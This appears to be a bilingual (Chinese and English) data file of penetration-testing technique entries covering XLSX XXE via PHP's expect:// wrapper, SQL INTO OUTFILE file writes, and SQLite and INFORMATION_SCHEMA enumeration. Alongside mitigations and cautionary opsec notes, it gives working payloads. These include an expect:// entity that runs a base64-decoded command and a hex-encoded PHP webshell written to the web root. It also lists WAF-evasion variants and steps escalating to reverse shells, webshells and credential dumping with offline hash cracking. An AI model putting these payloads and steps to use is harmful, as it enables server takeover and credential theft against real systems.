opsecTips.zh: XLSX XXE 只读专用 marker，禁止系统/网络实体和大型工作簿；出现真实文件读取、外连、公式/宏执行、内存增长或队列积压时停止。
opsecTips.en: XLSX XXE reads a dedicated marker only and forbids system or network entities and large workbooks; stop on real-file reads, egress, formula or macro execution, memory growth, or queue backlog.

opsecTips.zh: 删除 XLSX、解包目录、导入记录/预览和 marker，清理表格任务/对象存储/解析缓存并重启隔离 importer。
opsecTips.en: Delete XLSX files, extraction directories, imported records or previews, and markers, clear spreadsheet jobs, object storage, and parser caches, and restart isolated importers.

description.zh: toupper+base64 双 filter 串联，规避单一 base64-encode 特征；成功判据：单元格出现可解码源码。
description.en: Chains toupper+base64 filters to evade the lone base64-encode signature. Success: a decodable source string appears in the cell.

description.zh: 改用 zlib.deflate 输出二进制流，绕过 base64 关键词；成功判据：内容 deflate 解压后为配置源码。
description.en: Uses zlib.deflate for binary output to avoid the base64 keyword. Success: inflating the content yields config source.

description.zh: 把 filter 实体移到 worksheet 部件绕过对 sharedStrings 的定向检查；成功判据：单元格回显源码编码。
description.en: Moves the filter entity to the worksheet part to bypass sharedStrings-focused checks. Success: the cell echoes the encoded source.

name.zh: XLSX SharedStrings PHP Expect 实体

description.zh: 隔离 expect:// 变体，验证 PHP expect 扩展是否暴露给 SpreadsheetML resolver。
description.en: Isolates the expect:// variant to test whether the PHP expect extension is exposed to the SpreadsheetML resolver.

overview.zh: 覆盖 SpreadsheetML resolver 对 PHP expect:// 包装器的暴露验证：以 SharedStrings 实体承载 expect:// 包装器，返回任务 marker 即确认 expect 执行边界被触达。
overview.en: Covers exposure verification of the PHP expect:// wrapper in SpreadsheetML resolvers: a SharedStrings entity carrying the expect:// wrapper, with the returned task marker confirming the expect execution boundary was reached.

vulnerability.zh: 根因是 PHP expect 扩展启用时 expect:// wrapper 对表格导入解析器可用，实体内容会被当作命令执行；与文件读取是独立升级路径，需单独确认。
vulnerability.en: The root cause is the expect:// wrapper being available to spreadsheet import parsers when the PHP expect extension is enabled, so entity content executes as a command; this escalation path is independent of file reads and needs separate confirmation.

exploitation.zh: 使用第 1 步命令以 SharedStrings 实体承载 expect:// 包装器；wrapper 返回当前任务 marker 即确认 expect 执行边界被触达。绝不运行原始 id 命令，只用无子进程测试 wrapper；先记录 expect 扩展状态，在隔离环境触发导入后按任务关联结果。wrapper 不可用时的报错形态留档作为阴性依据。
exploitation.en: Use the step 1 command to carry the expect:// wrapper in a SharedStrings entity; the wrapper returning the current task marker confirms the expect execution boundary was reached. Never run the raw id command — use only a subprocess-free test wrapper; record the expect extension state first, then correlate results by task after triggering imports in an isolated environment. Archive the error shape as negative evidence when the wrapper is unavailable.

mitigation.zh: 生产 PHP 禁用 expect 扩展，表格解析栈禁用外部实体与自定义 wrapper；修复后 expect 实体应报未知 wrapper 且无 marker 返回。
mitigation.en: Disable the expect extension in production PHP and forbid external entities and custom wrappers in the spreadsheet parsing stack; after the fix, expect entities must report an unknown wrapper with no marker returned.

description.zh: 通过导入接口的报错与响应特征确认PHP运行时，检查实体声明不被过滤，入口可提交即准备expect包装器执行链。
description.en: Confirm the PHP runtime from importer errors and responses and that entity declarations survive filtering; the entry is ready for expect.

title.en: Inject an expect entity to verify execution

description.zh: 用执行区载荷在SharedStrings声明expect://id实体并触发导入，响应或日志出现uid输出即确认表格入口可执行命令。
description.en: Declare the expect://id entity per the execution payload and import; uid output in the response or logs confirms command execution.

title.en: Run escalation commands to drop a shell

description.zh: 将expect命令换成反弹shell或写马语句，沿用第2步的注入方式上传导入，收到回连会话即控制服务器。
description.en: Swap the expect command for a reverse shell or webshell write, re-importing as in step 2; the callback session owns the server.

prerequisites.zh: 服务端 XLSX 导入、预览或索引流程解包并解析 xl/sharedStrings.xml，XML parser 与共享字符串读取路径已确认。
prerequisites.en: A server-side XLSX import, preview, or indexing flow unpacks and parses xl/sharedStrings.xml, with XML parser and shared-string read path confirmed.

prerequisites.zh: 最小合法 XLSX 只让实体指向导入 worker 沙箱内 marker，并保存 ZIP 成员哈希、任务/工作表 ID、文件审计与单元格输出。
prerequisites.en: A minimal valid XLSX points the entity only to a marker inside the import-worker sandbox and preserves ZIP-member hashes, job or worksheet identifiers, file audit, and cell output.

analysis.zh: 阳性要求测试 wrapper 在处理该 XLSX 的 PHP worker 内被调用；命令文本、scheme 识别或导入错误不能证明执行。
analysis.en: A positive requires the test wrapper to run in the PHP worker processing this XLSX; command text, scheme recognition, or import errors do not prove execution.

opsecTips.zh: XLSX XXE 只读专用 marker，禁止系统/网络实体和大型工作簿；出现真实文件读取、外连、公式/宏执行、内存增长或队列积压时停止。
opsecTips.en: XLSX XXE reads a dedicated marker only and forbids system or network entities and large workbooks; stop on real-file reads, egress, formula or macro execution, memory growth, or queue backlog.

opsecTips.zh: 删除 XLSX、解包目录、导入记录/预览和 marker，清理表格任务/对象存储/解析缓存并重启隔离 importer。
opsecTips.en: Delete XLSX files, extraction directories, imported records or previews, and markers, clear spreadsheet jobs, object storage, and parser caches, and restart isolated importers.

wafBypass.command:
xl/sharedStrings.xml:
<?xml version="1.0"?><!DOCTYPE s [<!ENTITY x SYSTEM "expect://echo aWQ=|base64 -d">]><sst><si><t>&x;</t></si></sst>

description.zh: 命令 base64 化规避 expect://id 特征；成功判据：单元格含 uid。
description.en: Base64-encodes the command to evade expect://id signatures. Success: the cell contains uid.

description.zh: 实体注入非首张工作表部件，绕过 sheet1/sharedStrings 定向检查；成功判据：解析触发命令执行。
description.en: Injects into a non-first worksheet part to bypass sheet1/sharedStrings-focused checks. Success: parsing triggers command execution.

description.zh: $IFS 代替空格规避空格分隔特征；成功判据：flag 回显。
description.en: Replaces spaces with $IFS to evade whitespace-separated signatures. Success: flag echoed.

name.zh: SQL INTO OUTFILE 写文件原语

description.zh: 使用 INTO OUTFILE 语法验证注入查询和数据库账户是否能够在数据库主机文件系统写入测试标记。
description.en: Uses INTO OUTFILE syntax to test whether an injected query and database account can write a marker into the database host filesystem.

overview.zh: 覆盖 INTO OUTFILE 写文件原语验证：在参数后拼接 INTO OUTFILE 写入随机路径的 marker 文件，确认注入查询与数据库账户能否在数据库主机文件系统创建文件。
overview.en: Covers INTO OUTFILE write-primitive verification: appending INTO OUTFILE after parameters to write a marker file at a random path, confirming whether the injected query and database account can create files on the database host filesystem.

vulnerability.zh: 根因是注入点控制查询结构、驱动允许相应语句、数据库账户具备 FILE 类权限且数据库进程对目标目录可写；若可写目录被 Web 服务器执行，风险可升级但必须单独证明。
vulnerability.en: The root cause is the injection point controlling query structure, the driver allowing the statement, the database account holding FILE-class privileges, and the database process writing to the target directory; if the writable directory is web-executed, risk escalates but requires separate proof.

exploitation.zh: 使用第 1 步命令在参数后拼接 INTO OUTFILE 写入随机路径的 marker 文件；文件在指定目录出现且内容为固定无害标记即确认写文件原语可用。把路径改为一次性容器中专用空目录内的随机文件名，禁止写入 Web 根或系统路径；关联数据库审计、进程文件写入与文件哈希，随后立即删除。
exploitation.en: Use the step 1 command to append INTO OUTFILE after parameters writing a marker file at a random path; the file appearing in the designated directory with fixed harmless-marker content confirms the write primitive. Point paths at random filenames inside a dedicated empty directory in a one-off container — never write web roots or system paths; correlate database audit, process file writes, and file hashes, then delete immediately.

mitigation.zh: 修复注入并移除应用数据库账户的 FILE/外部写入权限，数据库容器使用只读根文件系统与最小可写卷，Web 服务与数据库文件系统隔离；监控异常 OUTFILE/DUMPFILE 语句。
mitigation.en: Fix injection and revoke FILE/external-write privileges from application database accounts, running database containers with read-only root filesystems and minimal writable volumes, isolating web services from the database filesystem; monitor abnormal OUTFILE/DUMPFILE statements.

title.zh: 确认注入点与文件写权限

description.zh: 在目标参数先用单引号与恒真语句确认SQL注入成立，再查secure_file_priv与当前用户权限，具备DBA与写权限即满足前提。
description.en: Confirm SQL injection with quote and tautology probes, then check secure_file_priv and the current user; DBA plus write access satisfies the prerequisite.

title.zh: 写入探测文件确认原语
title.en: Write a probe file to confirm the primitive

description.zh: 用执行区载荷在参数后拼接INTO OUTFILE写入随机路径文件，目标目录出现该文件且内容匹配即确认数据库进程可写盘。
description.en: Append INTO OUTFILE per the execution payload to write a random-path file; the file appearing with matching content confirms disk write.

description.zh: 通过报错页、phpinfo或已知路径规则推断站点根目录，用读取函数验证路径存在，锁定可访问的落盘位置即准备写马。
description.en: Infer the docroot from error pages, phpinfo, or known layouts and verify with a read; a reachable drop location readies the webshell.

title.en: Drop a webshell for code execution

description.zh: 沿用第2步的载荷写入方式，把文件内容换成一句话木马并写入Web根，浏览器访问木马能执行命令即完成从注入到RCE推进。
description.en: Reuse the step-2 write with a one-line webshell into the docroot; the shell executing commands completes injection-to-RCE.

prerequisites.zh: 仅在可回滚数据库容器中验证写文件能力
prerequisites.en: File-write capability is tested only in a disposable database container.

prerequisites.zh: 测试目录非 Web 根目录且只允许写入固定标记
prerequisites.en: The test directory is outside the web root and accepts only a fixed marker.

analysis.zh: 将 SQL 注入、数据库文件权限、目录可写和 Web 执行映射分别证明。测试文件写入不自动等于 WebShell 或 RCE。
analysis.en: Prove SQL injection, database file privilege, directory writability, and web execution mapping separately. A test file write is not automatically a webshell or RCE.

opsecTips.zh: 仅在一次性容器写固定标记，禁止写 PHP/JSP/ASP 或覆盖文件。
opsecTips.en: Write only a fixed marker in a disposable container; never write PHP, JSP, ASP, or overwrite files.

opsecTips.zh: 验证后立即删除文件并撤销临时权限，保存哈希而非文件内容。
opsecTips.en: Delete the file and revoke temporary privilege immediately, retaining a hash rather than content.

description.zh: 绕过对 UNION SELECT INTO OUTFILE 整链特征：逐段注释分词加大小写；目标路径文件生成即成功。
description.en: Comment-split the whole write chain with case mixing; the file appearing at the target path confirms success.

description.zh: 绕过对明文 webshell 语句的报文体扫描：载荷整体十六进制并改走 DUMPFILE；文件可访问执行命令即成功。
description.en: Hex-encode the shell and switch to DUMPFILE to evade body scans; the written file executing commands confirms success.

wafBypass.command: ?id=1337) UNION SELECT 1 INTO OUTFILE '{WEB_ROOT}/{SHELL_NAME}' FIELDS TERMINATED BY 0x3C3F7068702073797374656D28245F4745545B22636D64225D293B3F3E--

description.zh: 绕过对 SELECT 常量携带代码的检测：正文只写数字，代码藏进字段终止符十六进制；生成的文件含 PHP 代码即成功。
description.en: Hide the code in a hex field terminator while the SELECT carries only a number; PHP code present in the written file confirms success.

name.zh: SQLite 版本、Schema 与列枚举
name.en: SQLite Version, Schema, and Column Enumeration

description.zh: 使用 sqlite_version、sqlite_master、group_concat 与 pragma_table_info 验证 SQLite UNION 注入和测试 schema 元数据可见性。
description.en: Uses sqlite_version, sqlite_master, group_concat, and pragma_table_info to test SQLite UNION injection and visibility of test-schema metadata.

overview.zh: 覆盖 SQLite 专用元数据枚举链：sqlite_version() 版本确认、sqlite_master 表清单与建表 SQL、pragma_table_info 列定义。适用于确认后端为 SQLite 后逐步展开 schema 枚举的场景。
overview.en: Covers the SQLite-specific metadata enumeration chain: sqlite_version() confirmation, sqlite_master table listings and CREATE statements, and pragma_table_info column definitions. Suitable for staged schema enumeration after confirming a SQLite backend.

vulnerability.zh: 根因是用户输入被拼接进 SQLite 查询结构，允许 UNION 注入调用 sqlite_master 或 PRAGMA 表值函数；即使业务表权限有限，SQLite 连接通常仍能读取该数据库内的完整 schema。
vulnerability.en: The root cause is user input concatenated into SQLite query structure, letting UNION injection call sqlite_master or PRAGMA table-valued functions; even with limited business-table privileges, a SQLite connection usually reads the full schema within its database.

exploitation.zh: 使用第 1 步命令逐条读取 sqlite_version()、sqlite_master 与 pragma_table_info；回显版本串、表清单与列定义即确认 SQLite 元数据可枚举。先用常量 UNION 确认列数与类型，再把 users 替换为专用伪数据表并限制返回长度。枚举结果限定在测试表范围内，越界即停止并记录。
exploitation.en: Use the step 1 command to read sqlite_version(), sqlite_master, and pragma_table_info one by one; echoed version string, table listings, and column definitions confirm SQLite metadata enumeration. First confirm column count and types with a constant UNION, then replace users with a dedicated dummy table and cap return length. Confine enumeration results to test tables, stopping and logging on any overrun.

mitigation.zh: 所有查询值参数绑定，动态列/表名映射到服务端枚举；SQLite 文件与备份使用最小文件权限，错误不返回 schema；修复后重放元数据查询应报列不匹配或无回显。
mitigation.en: Bind all query values as parameters and map dynamic column/table names to server-side enums; apply minimal file permissions to SQLite files and backups, keep schemas out of errors; after the fix, replayed metadata queries must raise column mismatches or produce no echo.

title.en: Pin down UNION column count and echo slots

description.zh: 用ORDER BY递增探测列数，再用NULL填充的UNION语句定位回显位置，页面出现可控数字即拿到数据抽取出口。
description.en: Walk ORDER BY upward, then UNION with NULLs to find echo positions; controllable digits on the page open the extraction channel.

description.zh: 用执行区载荷依次查询sqlite_version、sqlite_master的表名与建表语句，回显出版本串与表清单即完成结构测绘。
description.en: Query sqlite_version and sqlite_master per the execution payload; a version string and table list complete the schema map.

title.en: Target and dump the data table

description.zh: 把查询换成pragma_table_info列出的敏感表字段，沿用第2步的UNION形式逐段读取，拿到账号口令字段即完成拖库。
description.en: Read the sensitive columns surfaced by pragma_table_info with the step-2 UNION shape; harvesting credential fields completes the dump.

prerequisites.zh: 目标已确认使用 SQLite 且测试查询列数兼容 UNION
prerequisites.en: The target is confirmed to use SQLite and the test query has UNION-compatible columns.

prerequisites.zh: 使用只含伪数据和专用 users 表的数据库副本
prerequisites.en: A database copy contains only synthetic data and a dedicated users table.

analysis.zh: 版本、schema、表名和列名是不同深度的证据。只在专用测试库验证到固定元数据即可停止，不需要导出表内容。
analysis.en: Version, schema, relation, and column names represent increasing evidence depth. Stop after fixed metadata is proven in a dedicated test database; table contents are unnecessary.

opsecTips.zh: 将 users 替换为伪数据表并限制 group_concat 输出，避免收集生产 schema。
opsecTips.en: Replace users with a synthetic table and cap group_concat output to avoid collecting production schema.

opsecTips.zh: 使用数据库副本并保留只读快照，测试结束后销毁。
opsecTips.en: Use a database copy with a read-only snapshot and destroy it after testing.

wafBypass.command: 1 UNION SELECT name FROM sqlite_master WHERE type=0x7461626c65--

description.zh: 绕过对 table 引号常量的过滤：字符串改十六进制比较；表名清单回显即成功。
description.en: Compare the type against a hex literal to evade quoted-constant filters; an echoed table list confirms success.

description.zh: 绕过对 sqlite_master 目录表的访问限制：改用 PRAGMA 指令枚举列结构；列名清单返回即成功。
description.en: Enumerate columns via PRAGMA when the catalog table is restricted; a returned column list confirms success.

description.zh: 绕过对 sqlite_master 全字匹配：注释插入关键字与表名之间；建表语句回显即成功。
description.en: Comment-split between keywords and the catalog name against whole-word matching; echoed CREATE statements confirm success.

name.zh: INFORMATION_SCHEMA 表与列枚举

description.zh: 使用 INFORMATION_SCHEMA.TABLES/COLUMNS 验证 UNION 注入是否能枚举测试数据库的关系和列元数据。
description.en: Uses INFORMATION_SCHEMA.TABLES and COLUMNS to test whether UNION injection can enumerate relation and column metadata in a test database.

overview.zh: 覆盖 INFORMATION_SCHEMA 标准目录枚举验证：经 UNION 注入读取 TABLES/COLUMNS 表与列清单，证明专用测试表可被枚举。适用于 MySQL、PostgreSQL、SQL Server 等暴露标准目录接口的数据库。
overview.en: Covers INFORMATION_SCHEMA standard-catalog enumeration via UNION injection: reading TABLES/COLUMNS listings to prove dedicated test tables are enumerable. Suitable for databases exposing the standard catalog interface, including MySQL, PostgreSQL, and SQL Server.

vulnerability.zh: 根因是输入控制 UNION 查询结构且数据库账户可读取目录视图；元数据帮助推断业务 schema 与敏感列，即使当前查询本身不返回业务记录。
vulnerability.en: The root cause is input controlling UNION query structure while the database account can read catalog views; metadata helps infer business schemas and sensitive columns even when the current query returns no business records.

exploitation.zh: 使用第 1 步命令逐条读取 INFORMATION_SCHEMA 表与列清单；回显表名/列名即确认标准目录可枚举。先确认方言、列数与专用 schema，把 users 替换为伪表并添加 schema 过滤与结果上限，不扫描整个生产目录。结果集加 LIMIT 控制返回规模，避免大目录拖垮查询。
exploitation.en: Use the step 1 command to read INFORMATION_SCHEMA table and column listings one by one; echoed table/column names confirm the standard catalog is enumerable. First confirm dialect, column count, and the dedicated schema, replace users with a dummy table, and add schema filtering with a result cap rather than sweeping the whole production catalog. Cap result sets with LIMIT so large catalogs never drag down queries.

mitigation.zh: 参数化查询，动态标识符经服务端映射，数据库账户只授予业务对象权限并尽可能限制目录可见性；错误不泄露 schema，异常 INFORMATION_SCHEMA 访问进入审计与告警。
mitigation.en: Parameterize queries, map dynamic identifiers server-side, grant the database account only business-object privileges, and limit catalog visibility where feasible; keep schemas out of errors and route abnormal INFORMATION_SCHEMA access into audit and alerting.

title.en: Map column count and echo positions

description.zh: 以ORDER BY与UNION NULL组合确定查询列数，标记页面回显位，出现可控占位数字即建立数据抽取通道。
description.en: Combine ORDER BY with UNION NULLs to fix the column count and mark echo slots; controllable placeholders open the channel.

title.en: Enumerate the table and column catalog

description.zh: 用执行区载荷查询INFORMATION_SCHEMA.TABLES与COLUMNS，回显出库内表名与目标表的列名即完成数据布局测绘。
description.en: Query INFORMATION_SCHEMA.TABLES and COLUMNS per the execution payload; table and column names map the data layout.

description.zh: 用列出的用户与口令字段构造UNION查询逐批读取，得到哈希后离线破解并在登录口复验，成功登录即转化为账户控制。
